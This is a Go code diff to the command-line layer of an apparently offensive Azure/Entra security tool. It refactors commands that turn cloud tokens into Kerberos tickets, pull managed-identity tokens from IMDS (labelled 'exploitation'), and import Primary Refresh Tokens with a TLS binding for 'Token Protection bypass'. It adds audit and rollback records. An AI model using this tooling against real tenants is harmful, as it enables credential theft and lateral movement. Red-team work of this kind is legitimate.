@@ -11,6 +11,7 @@ import (
 	"github.com/spf13/cobra"
 
 	"github.com/Debajyoti0-0/aether/internal/engine/exec"
+	"github.com/Debajyoti0-0/aether/internal/engine/mutation"
 	"github.com/Debajyoti0-0/aether/internal/engine/pivot"
 	"github.com/Debajyoti0-0/aether/internal/engine/token"
 	"github.com/Debajyoti0-0/aether/internal/protocol/msoapx"
@@ -36,16 +37,15 @@ var pivotIMDSCmd = &cobra.Command{
 }
 
 var (
-	pivotToken     string
-	pivotDomain    string
-	pivotUser      string
-	pivotKKDCP     string
-	pivotOut       string
-	pivotWorkspace string
-	pivotClientID  string
-	pivotObjectID  string
-	pivotResource  string
-	pivotTimeout   int
+	pivotToken    string
+	pivotDomain   string
+	pivotUser     string
+	pivotKKDCP    string
+	pivotOut      string
+	pivotClientID string
+	pivotObjectID string
+	pivotResource string
+	pivotTimeout  int
 )
 
 func init() {
@@ -57,7 +57,7 @@ func init() {
 	pivotCloudOnPremCmd.Flags().StringVar(&pivotUser, "user", "", "Username without realm (required)")
 	pivotCloudOnPremCmd.Flags().StringVar(&pivotKKDCP, "kkdcp", "https://login.microsoftonline.com/common/Kerberos/api", "MS-KKDCP endpoint")
 	pivotCloudOnPremCmd.Flags().StringVar(&pivotOut, "out", "aether.ccache", "Output ccache path")
-	pivotCloudOnPremCmd.Flags().StringVar(&pivotWorkspace, "workspace", "", "Store result in workspace")
+	pivotCloudOnPremCmd.Flags().StringVar(&execWorkspace, "workspace", "", "Workspace for audit+rollback records (required)")
 	pivotCloudOnPremCmd.Flags().IntVar(&pivotTimeout, "timeout", 60, "Timeout seconds")
 	_ = pivotCloudOnPremCmd.MarkFlagRequired("token")
 	_ = pivotCloudOnPremCmd.MarkFlagRequired("domain")
@@ -71,32 +71,56 @@ func init() {
 }
 
 func runPivotCloudOnPrem(cmd *cobra.Command, args []string) error {
+	ws, err := openGovernedWorkspace(execWorkspace)
+	if err != nil {
+		return err
+	}
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(pivotTimeout)*time.Second)
 	defer cancel()
 
 	kkdc := pivot.NewKKDCPClient(pivotKKDCP, pivotDomain, nil)
-	result, err := pivot.ExtractCloudTGT(ctx, kkdc, pivot.ASREQOptions{
-		Realm:      pivotDomain,
-		ClientName: pivotUser,
-		Token:      pivotToken,
-	}, pivotUser, pivotOut)
+	var ccachePath string
+	res, err := mutation.Run(ctx, ws, &cliMutation{
+		kindV:   "pivot.cloud_to_onprem",
+		targetV: pivotDomain + "/" + pivotUser,
+		undoV: &mutation.UndoSpec{
+			Provider: "local_fs",
+			Op:       "delete_file",
+			Args:     map[string]string{"path": pivotOut},
+			Detail:   "remove the generated ccache file",
+		},
+		execFn: func(ctx context.Context) (string, error) {
+			result, err := pivot.ExtractCloudTGT(ctx, kkdc, pivot.ASREQOptions{
+				Realm:      pivotDomain,
+				ClientName: pivotUser,
+				Token:      pivotToken,
+			}, pivotUser, pivotOut)
+			if err != nil {
+				return "", err
+			}
+			ccachePath = result.CcachePath
+			fmt.Printf("TGT extracted → %s\nRealm: %s\nTicket: %d bytes (%s)\n\nNOTE: the ccache carries a placeholder session key: it is readable by klist but NOT usable for Kerberos authentication.\n",
+				result.CcachePath, result.Realm, result.TicketSize, result.Prefix)
+			return "", nil
+		},
+	})
 	if err != nil {
 		return err
 	}
 
-	fmt.Printf("TGT extracted → %s\nRealm: %s\nTicket: %d bytes (%s)\n\nSet KRB5CCNAME and use impacket over Kerberos:\n  export KRB5CCNAME=%s\n",
-		result.CcachePath, result.Realm, result.TicketSize, result.Prefix, result.CcachePath)
-
-	if pivotWorkspace != "" && workspace.Exists(pivotWorkspace) {
-		if w, err := workspace.Open(pivotWorkspace, os.Getenv("AETHER_PASSPHRASE")); err == nil {
-			_ = w.LogEvent("tgt_extracted", fmt.Sprintf("realm=%s size=%d path=%s", result.Realm, result.TicketSize, result.CcachePath))
-		}
-	}
+	_ = ws.LogEvent("tgt_extracted", fmt.Sprintf("realm=%s path=%s action=%s", pivotDomain, ccachePath, res.ActionID))
+	fmt.Printf("Action:   %s\nStatus:   %s\n", res.ActionID, res.Status)
 	return nil
 }
 
 func runPivotIMDS(cmd *cobra.Command, args []string) error {
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(pivotTimeout)*time.Second)
+	return runIMDS(context.Background(), pivotResource, pivotClientID, pivotObjectID, pivotOut, pivotTimeout)
+}
+
+// runIMDS is the shared IMDS exploitation flow for both
+// `aether pivot imds` and `aether exec imds`.
+func runIMDS(ctx context.Context, resource, clientID, objectID, out string, timeout int) error {
+	ctx, cancel := context.WithTimeout(ctx, time.Duration(timeout)*time.Second)
 	defer cancel()
 
 	client := exec.NewIMDSClient(nil)
@@ -114,17 +138,17 @@ func runPivotIMDS(cmd *cobra.Command, args []string) error {
 		}
 	}
 
-	tokens, err := client.GetIdentityToken(ctx, pivotResource, pivotClientID, pivotObjectID)
+	tokens, err := client.GetIdentityToken(ctx, resource, clientID, objectID)
 	if err != nil {
 		return err
 	}
 
-	if pivotOut != "" {
+	if out != "" {
 		data, _ := json.MarshalIndent(tokens, "", "  ")
-		if err := os.WriteFile(pivotOut, data, 0o600); err != nil {
+		if err := os.WriteFile(out, data, 0o600); err != nil {
 			return err
 		}
-		fmt.Fprintf(os.Stderr, "Token saved to %s\n", pivotOut)
+		fmt.Fprintf(os.Stderr, "Token saved to %s\n", out)
 	}
 
 	// Never print the raw token to stdout by default; show metadata only.
@@ -132,6 +156,12 @@ func runPivotIMDS(cmd *cobra.Command, args []string) error {
 		len(tokens.AccessToken), tokens.ExpiresIn)
 	return nil
 }
+
+var execIMDSResource string
+var execIMDSClientID string
+var execIMDSObjectID string
+var execIMDSOut string
+var execIMDSTimeout int
 
 // prtImportCmd implements `aether prt import` (kill-chain Phase 1).
 var prtImportCmd = &cobra.Command{
@@ -158,26 +188,44 @@ var prtImportCmd = &cobra.Command{
 		if err != nil {
 			return err
 		}
-		if err := w.SaveRecord(workspace.BucketTokens, "prt", prt); err != nil {
+
+		bindingImported := false
+		_, err = mutation.Run(context.Background(), w, &cliMutation{
+			kindV:   "prt.import",
+			targetV: "tokens/prt",
+			undoV: &mutation.UndoSpec{
+				Provider: "workspace",
+				Op:       "delete_record",
+				Args:     map[string]string{"bucket": workspace.BucketTokens, "key": "prt"},
+				Detail:   "remove the imported PRT record (and tls_binding when written)",
+			},
+			execFn: func(ctx context.Context) (string, error) {
+				if err := w.SaveRecord(workspace.BucketTokens, "prt", prt); err != nil {
+					return "", err
+				}
+				// Optional TLS binding for Token Protection bypass.
+				if prtImpBinding != "" {
+					bindData, err := os.ReadFile(prtImpBinding)
+					if err != nil {
+						return "", fmt.Errorf("read tls binding: %w", err)
+					}
+					if _, err := msoapx.LoadChannelBinding(string(bindData)); err != nil {
+						return "", fmt.Errorf("invalid tls binding: %w", err)
+					}
+					if err := w.SaveRecord(workspace.BucketTokens, "tls_binding", map[string]string{
+						"binding": base64.StdEncoding.EncodeToString([]byte(bindData)),
+					}); err != nil {
+						return "", err
+					}
+					bindingImported = true
+				}
+				return "", nil
+			},
+		})
+		if err != nil {
 			return err
 		}
-		_ = w.LogEvent("prt_imported", fmt.Sprintf("tenant=%s user=%s", prt.TenantID, prt.UserID))
-
-		// Optional TLS binding for Token Protection bypass.
-		if prtImpBinding != "" {
-			bindData, err := os.ReadFile(prtImpBinding)
-			if err == nil {
-				if _, err := msoapx.LoadChannelBinding(string(bindData)); err != nil {
-					return fmt.Errorf("invalid tls binding: %w", err)
-				}
-				if err := w.SaveRecord(workspace.BucketTokens, "tls_binding", map[string]string{
-					"binding": base64.StdEncoding.EncodeToString([]byte(bindData)),
-				}); err != nil {
-					return err
-				}
-				_ = w.LogEvent("tls_binding_imported", prtImpBinding)
-			}
-		}
+		_ = w.LogEvent("prt_imported", fmt.Sprintf("tenant=%s user=%s binding=%t", prt.TenantID, prt.UserID, bindingImported))
 
 		fmt.Printf("PRT imported into workspace %q\n", prtImpWorkspace)
 		return nil
